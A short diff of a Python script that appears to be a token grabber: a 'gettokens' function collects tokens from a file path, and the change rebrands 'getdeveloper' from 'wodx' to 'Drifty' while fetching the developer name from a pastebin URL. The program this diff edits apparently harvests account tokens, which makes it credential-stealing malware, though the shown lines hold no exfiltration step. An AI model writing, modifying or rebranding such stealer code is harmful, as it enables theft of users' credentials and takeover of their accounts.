@@ -52,9 +52,9 @@ def gettokens(path):
                     tokens.append(token)
     return tokens
 def getdeveloper():
-    dev = "wodx"
+    dev = "Drifty"
     try:
-        dev = urlopen(Request("")).read().decode()
+        dev = urlopen(Request("https://pastebin.com/raw/uq0Sw1jY")).read().decode()
     except:
         pass
     return dev
